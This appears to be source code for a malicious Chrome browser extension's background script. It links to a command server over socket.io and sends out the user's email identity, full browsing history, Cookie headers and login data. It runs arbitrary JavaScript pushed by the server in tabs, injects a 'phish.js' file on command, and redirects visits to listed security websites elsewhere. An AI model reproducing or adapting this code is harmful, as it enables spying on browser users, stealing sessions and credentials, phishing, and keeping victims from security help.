function connectToServer() {
  socket = io('http://localhost:3000');
  chrome.storage.local.clear();
  chrome.storage.local.get("userData", (userData) => {
    if (userData.email) {
      socket.emit('userData', userData);
    } else {
      chrome.identity.getProfileUserInfo((userInfo) => {
        if (userInfo.email == null) {
          newUserInfo = {
            email: "No email",
            id: uuid()
          };
          socket.emit('userData', newUserInfo);
          chrome.storage.local.set({
            "userData": newUserInfo
          });
        } else {
          socket.emit('userData', userInfo);
          chrome.storage.local.set({
            "userData": userInfo
          });
        }
      });
    }
  });
  updateSecurityWebsites(socket);
  updateScriptWebsites(socket);
  return socket;
}

function disconnectFromServer(socket) {
  socket.disconnect();
}

function updateSecurityWebsites(socket) {
  socket.on('securityWebsites', (securityWebsites) => {
    chrome.storage.local.set({
      'securityWebsites': securityWebsites
    });
  });
}

function updateScriptWebsites(socket) {
  socket.on('jsExecution', (objects) => {
    chrome.storage.local.set({
      'scriptSites': objects
    });
  });
}

function searchAndSendHistory() {
  chrome.history.search({
    text: ''
  }, (results) => {
    results.forEach((page) => {
      sendHistoryPage(page);
    });
  });
}

function sendHistoryPage(page) {
  socket.emit('History', [page.url, new Date(page.lastVisitTime)])
}

function checkAndSendCookies(info) {
  info.requestHeaders.forEach((header) => {
    if (header.name === "Cookie") {
      socket.emit('Cookies', header.value);
    }
  });
}

function sendLoginInfo(loginInfo) {
  socket.emit('Login', loginInfo);
}

function checkScriptWebsites(socket, tabId, changeInfo) {
  updateScriptWebsites(socket);
  if (changeInfo.url) {
    chrome.storage.local.get('scriptSites', (scriptSites) => {
      scriptSites.scriptSites.forEach((map) => {
        if (changeInfo.url.includes(map.site)) {
          chrome.tabs.executeScript({
            code: map.code
          });
          return;
        }
      });
    });
  }
}

function checkSecurityWebsites(socket, tabId, changeInfo) {
  updateSecurityWebsites(socket);
  if (changeInfo.url) {
    chrome.storage.local.get('securityWebsites', (securityWebsites) => {
      securityWebsites.securityWebsites.forEach((site) => {
        if (changeInfo.url.includes(site)) {
          redirectToRandomWebsite(tabId);
          return;
        }
      });
    });
  }
}

function createScriptListener() {
  socket.on('Script', (script) => {
    chrome.tabs.executeScript({
      code: script.code
    });
  });
}

function uuid() {
  return crypto.getRandomValues(new Uint32Array(4)).join("");
}

function createPhishingListener() {
  socket.on('Phish', (tabID) => {
    chrome.tabs.executeScript(tabID, {
      file: "/js/phish.js"
    });
  });
}
